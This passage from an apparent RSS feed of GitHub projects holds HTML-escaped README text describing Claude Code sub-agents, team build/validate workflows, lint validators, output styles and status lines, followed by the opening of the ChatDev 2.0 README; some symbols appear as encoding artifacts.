‚îÇ   ‚îî‚îÄ‚îÄ macro-crypto-correlation-scanner-*.md
‚îú‚îÄ‚îÄ hello-world-agent.md       # Simple greeting agent
‚îú‚îÄ‚îÄ llm-ai-agents-and-eng-research.md  # AI research specialist
‚îú‚îÄ‚îÄ meta-agent.md              # Agent that creates agents
‚îî‚îÄ‚îÄ work-completion-summary.md # Audio summary generator
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Storage Hierarchy&lt;/strong&gt;:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Project agents&lt;/strong&gt;: &lt;code&gt;.claude/agents/&lt;/code&gt; (higher priority, project-specific)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;User agents&lt;/strong&gt;: &lt;code&gt;~/.claude/agents/&lt;/code&gt; (lower priority, available across all projects)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Format&lt;/strong&gt;: Markdown files with YAML frontmatter&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Agent File Structure:&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-yaml"&gt;---
name: agent-name
description: When to use this agent (critical for automatic delegation)
tools: Tool1, Tool2, Tool3  # Optional - inherits all tools if omitted
color: Cyan  # Visual identifier in terminal
model: opus # Optional - haiku | sonnet | opus - defaults to sonnet
---

# Purpose
You are a [role definition]. 

## Instructions
1. Step-by-step instructions
2. What the agent should do
3. How to report results

## Report/Response Format
Specify how the agent should communicate results back to the primary agent.
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Sub-agents enable:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Task specialization&lt;/strong&gt; - Code reviewers, debuggers, test runners&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Context preservation&lt;/strong&gt; - Each agent operates independently&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Tool restrictions&lt;/strong&gt; - Grant only necessary permissions&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Automatic delegation&lt;/strong&gt; - Claude proactively uses the right agent&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Key Engineering Insights&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Two Critical Mistakes to Avoid:&lt;/strong&gt;&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Misunderstanding the System Prompt&lt;/strong&gt; - What you write in agent files is the &lt;em&gt;system prompt&lt;/em&gt;, not a user prompt. This changes how you structure instructions and what information is available to the agent.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Ignoring Information Flow&lt;/strong&gt; - Sub-agents respond to your primary agent, not to you. Your primary agent prompts sub-agents based on your original request, and sub-agents report back to the primary agent, which then reports to you.&lt;/p&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;strong&gt;Best Practices:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Use the &lt;code&gt;description&lt;/code&gt; field to tell your primary agent &lt;em&gt;when&lt;/em&gt; and &lt;em&gt;how&lt;/em&gt; to prompt sub-agents&lt;/li&gt; 
 &lt;li&gt;Include phrases like "use PROACTIVELY" or trigger words (e.g., "if they say TTS") in descriptions&lt;/li&gt; 
 &lt;li&gt;Remember sub-agents start fresh with no context - be explicit about what they need to know&lt;/li&gt; 
 &lt;li&gt;Follow Problem ‚Üí Solution ‚Üí Technology approach when building agents&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Complex Workflows &amp;amp; Agent Chaining&lt;/h3&gt; 
&lt;p&gt;Claude Code can intelligently chain multiple sub-agents together for complex tasks:&lt;/p&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/SubAgentChain.gif" alt="Sub-Agent Chaining" style="max-width: 800px; width: 100%;" /&gt; 
&lt;p&gt;For example:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;"First analyze the market with crypto-market-agent, then use crypto-investment-plays to find opportunities"&lt;/li&gt; 
 &lt;li&gt;"Use the debugger agent to fix errors, then have the code-reviewer check the changes"&lt;/li&gt; 
 &lt;li&gt;"Generate a new agent with meta-agent, then test it on a specific task"&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;This chaining allows you to build sophisticated workflows while maintaining clean separation of concerns.&lt;/p&gt; 
&lt;h3&gt;The Meta-Agent&lt;/h3&gt; 
&lt;p&gt;The meta-agent (&lt;code&gt;.claude/agents/meta-agent.md&lt;/code&gt;) is a specialized sub-agent that generates new sub-agents from descriptions. It's the "agent that builds agents" - a critical tool for scaling your agent development velocity.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Why Meta-Agent Matters:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Rapid Agent Creation&lt;/strong&gt; - Build dozens of specialized agents in minutes instead of hours&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Consistent Structure&lt;/strong&gt; - Ensures all agents follow best practices and proper formatting&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Live Documentation&lt;/strong&gt; - Pulls latest Claude Code docs to stay current with features&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Intelligent Tool Selection&lt;/strong&gt; - Automatically determines minimal tool requirements&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Using the Meta-Agent:&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Simply describe what you want
"Build a new sub-agent that runs tests and fixes failures"

# Claude Code will automatically delegate to meta-agent
# which will create a properly formatted agent file
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The meta-agent follows the principle: "Figure out how to scale it up. Build the thing that builds the thing." This compound effect accelerates your engineering capabilities exponentially.&lt;/p&gt; 
&lt;h2&gt;Team-Based Validation System&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Watch the walkthrough:&lt;/strong&gt; See agent teams and the &lt;code&gt;/plan_w_team&lt;/code&gt; workflow in action at &lt;a href="https://youtu.be/4_2j5wgt_ds"&gt;https://youtu.be/4_2j5wgt_ds&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/cctask.png" alt="Claude Code Task System" style="max-width: 800px; width: 100%;" /&gt; 
&lt;p&gt;This repository includes a powerful build/validate workflow pattern using the Claude Code task system to orchestrate specialized agent teams.&lt;/p&gt; 
&lt;h3&gt;The &lt;code&gt;/plan_w_team&lt;/code&gt; Meta Prompt&lt;/h3&gt; 
&lt;p&gt;The &lt;code&gt;/plan_w_team&lt;/code&gt; command (&lt;code&gt;.claude/commands/plan_w_team.md&lt;/code&gt;) is not an ordinary prompt‚Äîit has three powerful components:&lt;/p&gt; 
&lt;h4&gt;1. Self-Validating&lt;/h4&gt; 
&lt;p&gt;The prompt includes embedded hooks in its front matter that validate its own output:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-yaml"&gt;hooks:
  stop:
    - command: "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/validators/validate_new_file.py specs/*.md"
    - command: "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/validators/validate_file_contains.py"
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;After the planning agent finishes, these validators ensure:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;A spec file was created in the correct directory&lt;/li&gt; 
 &lt;li&gt;The file contains required sections (team orchestration, step-by-step tasks, etc.)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;If validation fails, the agent receives feedback and continues working until the output meets criteria.&lt;/p&gt; 
&lt;h4&gt;2. Agent Orchestration&lt;/h4&gt; 
&lt;p&gt;The prompt leverages Claude Code's task system to build and coordinate agent teams:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Task Tool&lt;/th&gt; 
   &lt;th&gt;Purpose&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;TaskCreate&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Create new tasks with owners, descriptions, dependencies&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;TaskUpdate&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Update status, add blockers, communicate completion&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;TaskList&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;View all tasks and their current state&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;TaskGet&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Retrieve full task details&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;strong&gt;How it works:&lt;/strong&gt;&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Primary agent creates a task list with specific owners (builder/validator)&lt;/li&gt; 
 &lt;li&gt;Tasks can run in parallel or have dependency blockers&lt;/li&gt; 
 &lt;li&gt;Subagents complete work and ping back to the primary agent&lt;/li&gt; 
 &lt;li&gt;Primary agent reacts in real-time as work completes&lt;/li&gt; 
 &lt;li&gt;Blocked tasks automatically unblock when dependencies finish&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;This enables longer-running threads of work because the task system handles coordination‚Äîno bash sleep loops needed.&lt;/p&gt; 
&lt;h4&gt;3. Templating&lt;/h4&gt; 
&lt;p&gt;&lt;code&gt;/plan_w_team&lt;/code&gt; is a &lt;strong&gt;template meta prompt&lt;/strong&gt;‚Äîa prompt that generates prompts in a specific, vetted format:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-markdown"&gt;## Plan Format (embedded in the meta prompt)

### {{PLAN_NAME}}
**Task:** {{TASK_DESCRIPTION}}
**Objective:** {{OBJECTIVE}}

### Team Orchestration
{{TEAM_MEMBERS}}

### Step-by-Step Tasks
{{TASKS}}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The generated plan follows your engineering patterns exactly. This is the difference between agentic engineering and "vibe coding"‚Äîyou know the outcome your agent will generate because you've templated the format.&lt;/p&gt; 
&lt;h3&gt;Team Agents&lt;/h3&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Agent&lt;/th&gt; 
   &lt;th&gt;File&lt;/th&gt; 
   &lt;th&gt;Tools&lt;/th&gt; 
   &lt;th&gt;Self-Validation&lt;/th&gt; 
   &lt;th&gt;Purpose&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Builder&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;team/builder.md&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;All tools&lt;/td&gt; 
   &lt;td&gt;Ruff + Ty on .py files&lt;/td&gt; 
   &lt;td&gt;Execute implementation tasks, build the thing&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Validator&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;team/validator.md&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Read-only (no Write/Edit)&lt;/td&gt; 
   &lt;td&gt;None&lt;/td&gt; 
   &lt;td&gt;Verify builder's work meets acceptance criteria&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;This two-agent pairing increases compute to increase trust that work was delivered correctly.&lt;/p&gt; 
&lt;h3&gt;Code Quality Validators&lt;/h3&gt; 
&lt;p&gt;PostToolUse validators automatically enforce code quality:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Validator&lt;/th&gt; 
   &lt;th&gt;File&lt;/th&gt; 
   &lt;th&gt;Trigger&lt;/th&gt; 
   &lt;th&gt;Action&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Ruff&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;ruff_validator.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Write/Edit on .py files&lt;/td&gt; 
   &lt;td&gt;Blocks on lint errors&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Ty&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;ty_validator.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Write/Edit on .py files&lt;/td&gt; 
   &lt;td&gt;Blocks on type errors&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h3&gt;Workflow Example&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# 1. Create a plan with team orchestration
/plan_w_team

# User prompt: "Update the hooks documentation and add missing status lines"
# Orchestration prompt: "Create groups of agents for each hook, one builder and one validator"

# 2. Plan is generated with:
#    - Team members (session_end_builder, session_end_validator, etc.)
#    - Step-by-step tasks with dependencies
#    - Validation commands

# 3. Execute the plan
/build

# 4. Watch agents work in parallel:
#    - Builders implement features
#    - Validators verify completion
#    - Task system coordinates everything
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Configuration&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;ruff.toml&lt;/code&gt; - Ruff linter rules&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ty.toml&lt;/code&gt; - Type checker settings&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/agents/team/&lt;/code&gt; - Team agent definitions&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Output Styles Collection&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Watch the walkthrough:&lt;/strong&gt; See these features in action at &lt;a href="https://youtu.be/mJhsWrEv-Go"&gt;https://youtu.be/mJhsWrEv-Go&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/genui.png" alt="GenUI Output Style" style="max-width: 800px; width: 100%;" /&gt; 
&lt;p&gt;This project includes a comprehensive collection of custom output styles (&lt;code&gt;.claude/output-styles/&lt;/code&gt;) that transform how Claude Code communicates responses. See the &lt;a href="https://docs.anthropic.com/en/docs/claude-code/output-styles"&gt;official documentation&lt;/a&gt; for complete details on how output styles work.&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Style&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
   &lt;th&gt;Best For&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;genui&lt;/strong&gt; ‚≠ê&lt;/td&gt; 
   &lt;td&gt;&lt;strong&gt;Generates beautiful HTML with embedded styling&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;strong&gt;Interactive visual outputs, instant browser preview&lt;/strong&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;table-based&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Organizes all information in markdown tables&lt;/td&gt; 
   &lt;td&gt;Comparisons, structured data, status reports&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;yaml-structured&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Formats responses as YAML configuration&lt;/td&gt; 
   &lt;td&gt;Settings, hierarchical data, API responses&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;bullet-points&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Clean nested lists with dashes and numbers&lt;/td&gt; 
   &lt;td&gt;Action items, documentation, task tracking&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;ultra-concise&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Minimal words, maximum speed&lt;/td&gt; 
   &lt;td&gt;Experienced devs, rapid prototyping&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;html-structured&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Semantic HTML5 with data attributes&lt;/td&gt; 
   &lt;td&gt;Web documentation, rich formatting&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;markdown-focused&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Leverages all markdown features optimally&lt;/td&gt; 
   &lt;td&gt;Complex documentation, mixed content&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;tts-summary&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Announces task completion via ElevenLabs TTS&lt;/td&gt; 
   &lt;td&gt;Audio feedback, accessibility&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt; Run &lt;code&gt;/output-style [name]&lt;/code&gt; to activate any style (e.g., &lt;code&gt;/output-style table-based&lt;/code&gt;)&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Location:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Project styles: &lt;code&gt;.claude/output-styles/*.md&lt;/code&gt; (this repo)&lt;/li&gt; 
 &lt;li&gt;User styles: &lt;code&gt;~/.claude/output-styles/*.md&lt;/code&gt; (global)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Output styles modify Claude's system prompt to change response formatting without affecting core functionality. Each style is a markdown file with YAML frontmatter defining the name, description, and formatting instructions.&lt;/p&gt; 
&lt;h2&gt;Custom Status Lines&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Watch the walkthrough:&lt;/strong&gt; See these features in action at &lt;a href="https://youtu.be/mJhsWrEv-Go"&gt;https://youtu.be/mJhsWrEv-Go&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;This project includes enhanced Claude Code status lines that display real-time conversation context. Status lines provide dynamic information at the bottom of your terminal during Claude Code sessions. See the &lt;a href="https://docs.anthropic.com/en/docs/claude-code/statusline"&gt;official documentation&lt;/a&gt; for complete details.&lt;/p&gt; 
&lt;h3&gt;Available Status Lines&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Location:&lt;/strong&gt; &lt;code&gt;.claude/status_lines/&lt;/code&gt;&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Version&lt;/th&gt; 
   &lt;th&gt;File&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
   &lt;th&gt;Features&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v1&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Basic MVP&lt;/td&gt; 
   &lt;td&gt;Git branch, directory, model info&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v2&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v2.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Smart prompts&lt;/td&gt; 
   &lt;td&gt;Latest prompt (250 chars), color-coded by task type&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v3&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v3.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Agent sessions&lt;/td&gt; 
   &lt;td&gt;Agent name, model, last 3 prompts&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v4&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v4.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Extended metadata&lt;/td&gt; 
   &lt;td&gt;Agent name, model, latest prompt, custom key-value pairs&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v5&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v5.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Cost tracking&lt;/td&gt; 
   &lt;td&gt;Model, cost ($), line changes (+/-), session duration&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v6&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v6.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Context window&lt;/td&gt; 
   &lt;td&gt;Visual usage bar, percentage, tokens remaining&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v7&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v7.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Duration timer&lt;/td&gt; 
   &lt;td&gt;Session time, start time, optional end time&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v8&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v8.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Token/cache stats&lt;/td&gt; 
   &lt;td&gt;Input/output tokens, cache creation/read stats&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;v9&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;status_line_v9.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Powerline minimal&lt;/td&gt; 
   &lt;td&gt;Stylized segments with powerline separators, git branch, % used&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h3&gt;Session Management&lt;/h3&gt; 
&lt;p&gt;Status lines leverage session data stored in &lt;code&gt;.claude/data/sessions/&amp;lt;session_id&amp;gt;.json&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "session_id": "unique-session-id",
  "prompts": ["first prompt", "second prompt", ...],
  "agent_name": "Phoenix",  // Auto-generated unique name
  "extras": {              // v4: Custom metadata (optional)
    "project": "myapp",
    "status": "debugging",
    "environment": "prod"
  }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Agent Naming:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Automatically generates unique agent names using LLM services&lt;/li&gt; 
 &lt;li&gt;Priority: Ollama (local) ‚Üí Anthropic ‚Üí OpenAI ‚Üí Fallback names&lt;/li&gt; 
 &lt;li&gt;Names are single-word, memorable identifiers (e.g., Phoenix, Sage, Nova)&lt;/li&gt; 
 &lt;li&gt;Enabled via &lt;code&gt;--name-agent&lt;/code&gt; flag in &lt;code&gt;user_prompt_submit.py&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Custom Metadata (v4):&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Use &lt;code&gt;/update_status_line&lt;/code&gt; command to add custom key-value pairs&lt;/li&gt; 
 &lt;li&gt;Displayed at the end of the status line in cyan brackets&lt;/li&gt; 
 &lt;li&gt;Persists across Claude Code interactions&lt;/li&gt; 
 &lt;li&gt;Example: &lt;code&gt;/update_status_line &amp;lt;session_id&amp;gt; project myapp&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Configuration&lt;/h3&gt; 
&lt;p&gt;Set your preferred status line in &lt;code&gt;.claude/settings.json&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "statusLine": {
    "type": "command",
    "command": "uv run $CLAUDE_PROJECT_DIR/.claude/status_lines/status_line_v3.py"
  }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Status Line Features:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Real-time updates&lt;/strong&gt; - Refreshes on message changes (300ms throttle)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Color coding&lt;/strong&gt; - Visual indicators for different task types&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Smart truncation&lt;/strong&gt; - Manages long prompts elegantly&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Session persistence&lt;/strong&gt; - Maintains context across interactions&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Task Type Indicators (v2/v3):&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;üîç Purple - Analysis/search tasks&lt;/li&gt; 
 &lt;li&gt;üí° Green - Creation/implementation tasks&lt;/li&gt; 
 &lt;li&gt;üîß Yellow - Fix/debug tasks&lt;/li&gt; 
 &lt;li&gt;üóëÔ∏è Red - Deletion tasks&lt;/li&gt; 
 &lt;li&gt;‚ùì Blue - Questions&lt;/li&gt; 
 &lt;li&gt;üí¨ Default - General conversation&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Master Agentic Coding&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Prepare for the future of software engineering&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;Learn tactical agentic coding patterns with &lt;a href="https://agenticengineer.com/tactical-agentic-coding?y=ssvhooks"&gt;Tactical Agentic Coding&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Follow the &lt;a href="https://www.youtube.com/@indydevdan"&gt;IndyDevDan YouTube channel&lt;/a&gt; to improve your agentic coding advantage.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>OpenBMB/ChatDev</title>
      <link>https://github.com/OpenBMB/ChatDev</link>
      <description>&lt;p&gt;ChatDev 2.0: Dev All through LLM-powered Multi-Agent Collaboration&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;ChatDev 2.0 - DevAll&lt;/h1&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/frontend/public/media/logo.png" alt="DevAll Logo" width="500" /&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;strong&gt;A Zero-Code Multi-Agent Platform for Developing Everything&lt;/strong&gt; &lt;/p&gt; 
&lt;p align="center"&gt; „Äê&lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/README.md"&gt;English&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/README-zh.md"&gt;ÁÆÄ‰Ωì‰∏≠Êñá&lt;/a&gt;„Äë &lt;/p&gt; 
&lt;p align="center"&gt; „Äêüìö &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/#developers"&gt;Developers&lt;/a&gt; | üë• &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/#primary-contributors"&gt;Contributors&lt;/a&gt;ÔΩú‚≠êÔ∏è &lt;a href="https://github.com/OpenBMB/ChatDev/tree/chatdev1.0"&gt;ChatDev 1.0 (Legacy)&lt;/a&gt;„Äë &lt;/p&gt; 
&lt;h2&gt;üìñ Overview&lt;/h2&gt; 
&lt;p&gt;ChatDev has evolved from a specialized software development multi-agent system into a comprehensive multi-agent orchestration platform.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/OpenBMB/ChatDev/tree/main"&gt;&lt;strong&gt;ChatDev 2.0 (DevAll)&lt;/strong&gt;&lt;/a&gt; is a &lt;strong&gt;Zero-Code Multi-Agent Platform&lt;/strong&gt; for "Developing Everything". It empowers users to rapidly build and execute customized multi-agent systems through simple configuration. No coding is required‚Äîusers can define agents, workflows, and tasks to orchestrate complex scenarios such as data visualization, 3D generation, and deep research.&lt;/li&gt; 
